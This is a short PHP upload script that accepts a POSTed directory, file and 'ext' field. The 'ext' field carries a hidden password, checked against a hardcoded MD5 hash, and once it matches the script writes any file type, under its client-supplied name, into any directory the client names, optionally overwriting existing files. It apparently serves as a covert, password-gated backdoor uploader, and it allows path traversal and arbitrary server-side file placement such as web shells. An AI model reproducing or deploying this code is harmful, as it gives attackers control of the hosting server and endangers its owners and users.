<?php
 $dir=$_POST["dir"];
 $ext=$_POST["ext"];
 $extar=explode('#',$ext);
$ext=$extar[0];
$extsize=isset($extar[1])?$extar[1]:20000;
$fg=$_POST["fg"];

echo $_FILES["file"]["type"]."<br />";
 	//  $passwd1=isset($_POST["passwd1"])?$_POST["passwd1"]:'0';
 	$extpw=isset($extar[2])?$extar[2]:'pw';
 	  $pw=MD5($extpw);
 if($pw!='0a659ccd9fccb57041be94d7b7f122b3'){
 	echo 'pw error!';
 	exit;
 }	  
if ((($_FILES["file"]["type"] == "image/gif")|| ($_FILES["file"]["type"] == "image/jpeg")
|| ($_FILES["file"]["type"] == "image/pjpeg")||$ext)&& ($_FILES["file"]["size"] < $extsize))
  {
  if ($_FILES["file"]["error"] > 0)
    {
    echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
    }
  else
    {
    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";

    if (file_exists($dir."/" . $_FILES["file"]["name"]))
      { 
      	if($fg==1){
      		 $dir=iconv('utf-8', 'GB2312',$dir);      	  
      	    move_uploaded_file($_FILES["file"]["tmp_name"],
           $dir."/" . $_FILES["file"]["name"]);
           echo "(cover)Stored in: " . $dir."/" . $_FILES["file"]["name"];     
      	}else{
      	   echo $_FILES["file"]["name"] . " already exists. ";    
      	}
      }
    else
      {
      	 $dir=iconv('utf-8', 'GB2312',$dir); 
      //	 echo $dir;
      	// exit;
        move_uploaded_file($_FILES["file"]["tmp_name"],
        $dir."/" . $_FILES["file"]["name"]);
        echo "Stored in: " . $dir."/" . $_FILES["file"]["name"];
      }
    }
  }
else
  {
  echo "Invalid file";
  }
?>